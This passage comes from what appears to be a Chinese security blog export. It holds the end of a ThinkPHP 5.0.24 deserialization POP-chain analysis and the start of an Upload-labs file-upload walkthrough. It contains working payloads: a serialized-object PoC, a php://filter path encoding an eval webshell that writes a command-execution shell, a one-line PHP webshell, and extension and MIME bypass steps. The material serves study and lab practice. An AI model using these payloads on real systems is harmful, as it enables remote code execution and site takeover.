class="variable">$query</span>);</span><br><span class="line">    <span class="variable">$pivot</span>=<span class="keyword">new</span> think\model\<span class="title function_ invoke__">Pivot</span>(<span class="variable">$output</span>,<span class="variable">$hasone</span>);</span><br><span class="line">    <span class="variable">$windows</span>=<span class="keyword">new</span> think\process\pipes\<span class="title function_ invoke__">Windows</span>(<span class="variable">$pivot</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$windows</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行payload后，会写入两个php文件</p>
<p>访问第二个<code>a.php3b58a9545013e88c7186db11bb158c44.php</code>文件，POST参数为ccc直接命令执行即可</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709232314618.png"></p>
<h3 id="POP链分析"><a href="#POP链分析" class="headerlink" title="POP链分析"></a>POP链分析</h3><p>全局搜索<code>__destruct()</code>方法，选择<code>thinkphp\library\think\process\pipes\Windows.php</code></p>
<p>入口是windows的析构方法</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708165745246.png"></p>
<p>继续跟进<code>removeFile()</code></p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708170305125.png"></p>
<p>存在<code>file_exists()</code>函数检查文件是否存在，而变量filename是字符串（也就是对filename的路径进行查找）</p>
<p>这里会有对象转换成字符串触发<code>__toString()</code>方法，全局搜索一下</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708175754409.png"></p>
<p>参考其他师傅的利用链，选择的是Model.php，跟进一下</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708180100853.png"></p>
<p>可以看到调用<code>toJson()</code>方法，继续跟进</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708180145356.png"></p>
<p>这里进行return的时候调用<code>toArray()</code>方法，继续跟进</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708180300230.png"></p>
<p>前面代码大概就是递归处理模型的关联对象，重点往下看</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708181753930.png"></p>
<p>首先我们要保证<code>$this→append</code>数组不为空</p>
<p>其次在遍历数组时，要进入第三个else语句中，需要满足</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)    <span class="comment">// 值不为数组</span></span><br><span class="line"><span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>) <span class="comment">// 值中不含.</span></span><br></pre></td></tr></table></figure>

<p>进入到else语句后，我们跟进下<code>$relation = Loader::parseName($name, 1, false);</code>的<code>parseName()</code>方法</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708182922643.png"></p>
<p>这里的type值为1，然后将下划线分隔的字符串转换为驼峰式命名，并根据 <code>$ucfirst</code> 决定首字母的大小写。</p>
<p>就是简单对传入参数进行转换，对正常字符串没有影响</p>
<p>回到Model.php，进入if语句<code>method_exists()</code>判断类方法是否存在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (method_exists($this, $relation)) &#123;</span><br><span class="line">    $modelRelation = $this-&gt;$relation();</span><br><span class="line">    $value         = $this-&gt;getRelationData($modelRelation);</span><br></pre></td></tr></table></figure>

<p>而这里<code>$relation</code>往前推就是<code>$name</code></p>
<p>我们在第899行下断点，不难发现<code>$name</code>赋值为getError</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709105211261.png"></p>
<p>我们搜索一下getError方法，作用就是返回值</p>
<p>也就是说我们的POC利用的是Model.php存在的类方法<code>getError()</code></p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709110001461.png"></p>
<p>当if判断为真后，对<code>$modelRelation</code>进行了赋值，在这里是通过<code>$this-&gt;$relation()</code>，也就是<code>$this-&gt;$getError()</code>完成的</p>
<p>所以返回值可控即<code>$modelRelation</code>可控，我们将其设置为了HasOne对象，至于为什么我们在后面进行分析</p>
<hr>
<p>我们继续往下看，是否<code>$value</code>也可控</p>
<p>跟进一下<code>getRelationData()</code></p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709111217400.png"></p>
<p>注意这里的if语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">isSelfRelation</span>() &amp;&amp; <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>))</span><br></pre></td></tr></table></figure>

<p>如果为真则执行<code>$value = $this-&gt;parent;</code>也就是<code>$value</code>由<code>$parent</code>决定</p>
<p>那么需要满足if三个条件</p>
<ul>
<li><code>$this-&gt;parent</code></li>
<li><code>!$modelRelation-&gt;isSelfRelation()</code></li>
<li><code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent))</code></li>
</ul>
<p><strong>第一个条件</strong></p>
<p>我们一个个看，先在902行下断点，调试发现</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709112137562.png"></p>
<p>POC将<code>$parent</code>指向的是<code>think\console\Output</code>类，之所以选择<code>think\console\Output</code>类是因为这是我们找到其存在合适的<code>__call()</code>方法，存在<code>call_user_func_array</code>函数可以进一步getshell</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709135401749.png"></p>
<p>回到Model.php，那么我们在最后执行的时候，让<code>$value</code>指向该类就可以触发<code>__call()</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p><strong>第二个条件</strong></p>
<p>我们跟进一下<code>isSelfRelation()</code>，注意到是返回<code>$selfRelation</code></p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709140708127.png"></p>
<p>我们如何让<code>!$modelRelation-&gt;isSelfRelation()</code>成立呢</p>
<p>我们前面提到了将<code>$modelRelation</code>设置为了HasOne对象，我们跟进一下</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709135839727.png"></p>
<p>HasOne类是OneToOne类的子类，而OneToOne类是抽象类无法生成实例</p>
<p>不过发现OneToOne类又是Relation类的子类</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709140447139.png"></p>
<p>所以<code>$selfRelation</code>可控，那么我们将其设为false即可</p>
<p>也就是POC中HasOne类对<code>$selfRelation</code>赋值，然后<code>isSelfRelation()</code>为false使得第二个条件成立</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">query</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query=<span class="variable">$query</span>; <span class="comment">//调用Query类的getModel</span></span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation=<span class="literal">false</span>; <span class="comment">//满足条件!$modelRelation-&gt;isSelfRelation()</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr=[<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;admin&#x27;</span>];  <span class="comment">//控制__call的参数$attr</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>第三个条件</strong></p>
<p>这里要求返回的对象的类名相同</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>))</span><br></pre></td></tr></table></figure>

<p><code>$modelRelation-&gt;getModel()</code>就指的是<code>Hasone::getModel()</code>，因为Hasone类是Relation类的子类，当然继承它的<code>getModel()</code>方法</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709143002495.png"></p>
<p>这里按住ctrl点击跟进，到<code>thinkphp\library\think\db\Query.php</code></p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709143112732.png"></p>
<p>所以左侧get_class获得的类名由<code>$model</code>决定，而右边我们前面也分析过<code>$parent</code>指向output类</p>
<p>所以我们只需要让<code>$model</code>的值为output对象即可</p>
<p>当然<code>$query</code>也要指向<code>thinkphp\library\think\db\Query.php</code>的<code>getModel()</code></p>
<hr>
<p><code>$modelRelation</code>和<code>$value</code>分析完后我们继续往下看</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709143822708.png"></p>
<p>if语句判断是否存在<code>getBindAttr()</code>类方法</p>
<p>虽然HasOne类并没有，不过它继承了父类的<code>getBindAttr()</code></p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709144029570.png"></p>
<p>所以if为真，执行<code>$bindAttr = $modelRelation-&gt;getBindAttr();</code></p>
<p>不过要注意<code>$bindAttr</code>定义的时候是<code>protected $bindAttr = [];</code>也就是数组格式</p>
<p>我们在第904行下断点，可以发现赋值<code>$bindAttr=[&#39;a&#39;=&gt;&#39;admin&#39;];</code></p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709145124298.png"></p>
<p>赋值后到第二个if语句，很明显if为真，然后遍历<code>$bindAttr</code>赋值给<code>$key =&gt; $attr</code>，因为<code>$key=a</code>所以保持不变。继续到第三个if语句，<code>$data</code>不存在a键名所以执行else语句，<code>$value</code>为真执行<code>$value-&gt;getAttr($attr)</code>触发<code>__call()</code>方法</p>
<blockquote>
<p>为什么可以触发<code>__call()</code>方法我们再理一下思路，<code>$value</code>是由<code>$parent</code>决定并且可控，前面提到我们将<code>$parent</code>指向Output类的，而Output类不存在getAttr()方法，所以就触发Output类的<code>__call()</code>方法达成我们目的</p>
</blockquote>
<p>继续跟进到<code>__call()</code>方法</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709164150929.png"></p>
<p>判断<code>$method</code>是否在<code>$styles</code>数组里，如果if为真执行<code>array_unshift($args, $method);</code></p>
<p>把<code>$method</code>拼接到<code>$args</code>数组的头部，我们可以下断点看看</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709170952503.png"></p>
<p>然后return执行<code>call_user_func_array()</code>函数调用block方法，跟进一下</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709171130568.png"></p>
<p>调用<code>writeIn()</code>方法，参数为<code>&lt;getAttr&gt;admin&lt;/getAttr&gt;</code>，这是上面2个变量拼贴来的</p>
<p>跟进<code>writeIn()</code>方法</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709172014994.png"></p>
<p>调用<code>write()</code>方法，参数为<code>&lt;getAttr&gt;admin&lt;/getAttr&gt;</code>，另外两个分别为<code>true,0</code></p>
<p>继续跟进<code>write()</code>方法</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709172137434.png"></p>
<p>这里最终还是调用<code>write()</code>方法，我们全局搜索一下。最终在<code>thinkphp\library\think\session\driver</code>路径下找到<code>Memcache.php</code>和<code>Memcached.php</code>存在利用点。不过这俩文件还是有点区别，在建立连接的时候<code>Memcached.php</code>使用<code>setSaslAuthData()</code>对身份进行认证</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709173740127.png"></p>
<p>因此我们选择利用<code>thinkphp\library\think\session\driver\Memcache.php</code></p>
<p>那么我们前面<code>write()</code>的handle指向Memcache类就行</p>
<blockquote>
<p>注：这里handle指向Memcached类也行，前面一通分析其实跟身份验证没啥关系，因为那是打开session的时候做的事，我们调用的<code>write()</code>方法是在写入session的时候做的，所以不管哪个类都能写webshell</p>
</blockquote>
<p>跟进到Memcache.php的<code>write()</code>方法</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709182751369.png"></p>
<p>调用set方法，全局搜索一下找到<code>thinkphp\library\think\cache\driver\File.php</code>存在<code>file_put_contents()</code></p>
<p>可以写入文件，跟进一下发现存在死亡<code>exit()</code>，用base64编码绕过</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709182927457.png"></p>
<p>我们先看<code>$filename</code>是如何赋值的，跟进<code>getCacheKey()</code>方法</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709194521983.png"></p>
<p>这里我们对<code>cache_subdir</code>和<code>prefix</code>进行赋值，然后跳过前面两个if语句到最后进行拼接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$filename = $this-&gt;options[&#x27;path&#x27;] . $name . &#x27;.php&#x27;;</span><br></pre></td></tr></table></figure>

<p>我们在第72行下断点，调试发现<code>$name</code>的值为前面出现过的<code>&lt;getAttr&gt;admin&lt;/getAttr&gt;</code></p>
<p>对<code>&lt;getAttr&gt;admin&lt;/getAttr&gt;</code>进行MD5加密后，与<code>$this-&gt;options[&#39;path&#39;]</code>和<code>.php</code>进行拼接</p>
<p>得到<code>$filename</code>为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php63ac11a7699c5c57d85009296440d77a.php</span></span><br></pre></td></tr></table></figure>

<p>虽然这里文件名可控，但是<code>$data</code>并不可控（<code>$value</code>值为true），也就是说即使创建了文件也不是我们的马</p>
<p>回到<code>set()</code>方法继续往下看，跟进<code>setTagItem()</code>方法</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709225558456.png"></p>
<p>我们赋值tag为1，然后<code>$key</code>为tag拼接MD5加密过的字符1，由于<code>$key</code>缓存并不存在所以执行else语句</p>
<p><code>$name</code>赋值给<code>$value</code>，然后再次调用<code>set()</code>方法</p>
<blockquote>
<p>这里再次调用该方法后，传递的<code>$value</code>和<code>$name</code>的值是一样的，我们可以看看到底发生了什么变化</p>
</blockquote>
<p>对于<code>file_put_contents($filename, $data);</code>中的<code>$filename</code>来说还是不变</p>
<p>而<code>$data</code>我们可以在第159行下断点看看，发现经过拼接后变成如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//000000000000</span><br><span class="line"> exit();?&gt;</span><br><span class="line">s:158:&quot;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php63ac11a7699c5c57d85009296440d77a.php&quot;;</span><br></pre></td></tr></table></figure>

<p>我们注意到存在和<code>$filename</code>一样的值，这也是绕过死亡函数的变种</p>
<p>类似于如下形式，具体绕过原理就不再赘述</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>

<p>这个写的第二个文件就是我们实现RCE的马，所以其实整个过程是写了两个php文件</p>
<p>写的路径就在根路径下，shell文件名为<code>a.php+md5(tag_c4ca4238a0b923820dcc509a6f75849b)+.php</code></p>
<p>以上就是整个POP链的调用分析</p>
<hr>
<h3 id="POP链调用过程图"><a href="#POP链调用过程图" class="headerlink" title="POP链调用过程图"></a>POP链调用过程图</h3><p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20221011115008-ccb4a1ce-4917-1.png"></p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于初学者来说，审这么又臭又长的代码确实是件非常具有挑战的事。除了本文讲到的前置知识和开发手册的内容外，还需要对反序列化基本概念非常了解以及绕过死亡函数的变种形式等等。以后有时间也会继续复现tp框架的其他漏洞。</p>
<hr>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://c1oudfl0w0.github.io/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://c1oudfl0w0.github.io/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
<p><a href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>ThinkPHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Upload-labs靶场</title>
    <url>/article/Upload-labs%E9%9D%B6%E5%9C%BA.html</url>
    <content><![CDATA[<p>非常经典的靶场，包含了比较详细的文件上传绕过手法</p>
<span id="more"></span>



<h1 id="Upload-labs靶场"><a href="#Upload-labs靶场" class="headerlink" title="Upload-labs靶场"></a>Upload-labs靶场</h1><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>创建<code>1.txt</code>，写入一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>由于打开页面源代码，发现上传的文件类型有限制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">        var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class="line">        if (file == null || file == &quot;&quot;) &#123;</span><br><span class="line">            alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        //定义允许上传的文件类型</span><br><span class="line">        var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">        //提取上传文件的类型</span><br><span class="line">        var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">        //判断上传文件类型是否允许上传</span><br><span class="line">        if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class="line">            var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以我们修改文件后缀为jpg</p>
<p>上传图片马，bp抓包修改<code>.jpg</code>为<code>.php</code></p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230713104402078.png"></p>
<p>上传成功后，打开蚁剑连接<code>../upload/1.php</code></p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230713104645569.png"></p>
<p>然后<code>getshell</code>成功</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230713104921488.png"></p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><blockquote>
<p>绕过js前端检测</p>
</blockquote>
<p>我们已经知道会对上传文件进行检测</p>
<p>我们F12，找到<code>checkFile()</code>的方法调用处</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230713105645558.png"></p>
<p>然后删掉即可绕过检测（或者将<code>checkFile()</code>改为<code>Ture</code>）</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230713105725273.png"></p>
<p>现在可以正常上传<code>.php</code>文件，然后蚁剑连接</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230713105846532.png"></p>
<p>然后<code>getshell</code>成功</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230713105914983.png"></p>
<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><p>同<code>Pass-01</code>方法一相同</p>
<p>(图片马直接过)</p>
<h3 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h3><blockquote>
<p>绕过MIME检测</p>
</blockquote>
<p>查看后端源代码，发现只对MIME类型进行检测</p>
<p>我们创建<code>1.php</code>,写入一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>上传，bp抓包修改MIME的<code>application/octet-stream</code>为<code>image/jpeg</code></p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230713112929389.png"></p>
<p>蚁剑连接，<code>getshell</code>成功</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230713113020931.png"></p>
<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>老样子传图片马，发现失败</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230714144330263.png"></p>
<p>查看源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);<span class="comment">//从右向左查找最后一个出现的点号&quot;.&quot;，并返回该字符及其后面的所有字符</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结合源代码分析，<code>1.php.</code>，<code>1.Php</code>，<code>1.php(空格)</code>，<code>1.php::$DATA</code>，<code>1.php.aa</code>均无法上传成功</p>
<p>那么我们可以上传<code>1.php</code>后，抓包改为<code>1.php3</code>，上传成功</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230714175106092.png"></p>
<p>由于<code>phpstudy</code>新版本没有TS，所以无法解析上传的php3文件(被当作文本)</p>
<p>反正是成功绕过</p>
<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>查看源代码</p>
